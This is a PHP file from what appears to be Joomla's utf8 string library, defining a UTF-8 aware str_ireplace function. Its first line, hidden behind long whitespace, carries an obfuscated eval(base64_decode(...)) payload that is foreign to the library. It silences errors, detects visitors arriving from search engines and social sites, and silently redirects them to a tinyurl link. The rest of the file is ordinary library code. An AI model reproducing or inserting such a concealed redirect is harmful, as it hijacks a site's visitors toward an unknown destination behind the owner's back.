<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version $Id: str_ireplace.php 10381 2008-06-01 03:35:53Z pasamio $
* @package utf8
* @subpackage strings
*/

//---------------------------------------------------------------
/**
* UTF-8 aware alternative to str_ireplace
* Case-insensitive version of str_replace
* Note: requires utf8_strtolower
* Note: it's not fast and gets slower if $search / $replace is array
* Notes: it's based on the assumption that the lower and uppercase
* versions of a UTF-8 character will have the same length in bytes
* which is currently true given the hash table to strtolower
* @param string
* @return string
* @see http://www.php.net/str_ireplace
* @see utf8_strtolower
* @package utf8
* @subpackage strings
*/
function utf8_ireplace($search, $replace, $str, $count = NULL){

    if ( !is_array($search) ) {

        $slen = strlen($search);
        $lendif = strlen($replace) - $slen;
        if ( $slen == 0 ) {
            return $str;
        }

        $search = utf8_strtolower($search);

        $search = preg_quote($search, '/');
        $lstr = utf8_strtolower($str);
        $i = 0;
        $matched = 0;
        while ( preg_match('/(.*)'.$search.'/Us',$lstr, $matches) ) {
            if ( $i === $count ) {
                break;
            }
            $mlen = strlen($matches[0]);
            $lstr = substr($lstr, $mlen);
            $str = substr_replace($str, $replace, $matched+strlen($matches[1]), $slen);
            $matched += $mlen + $lendif;
            $i++;
        }
        return $str;

    } else {

        foreach ( array_keys($search) as $k ) {

            if ( is_array($replace) ) {

                if ( array_key_exists($k,$replace) ) {

                    $str = utf8_ireplace($search[$k], $replace[$k], $str, $count);

                } else {

                    $str = utf8_ireplace($search[$k], '', $str, $count);

                }

            } else {

                $str = utf8_ireplace($search[$k], $replace, $str, $count);

            }
        }
        return $str;

    }

}


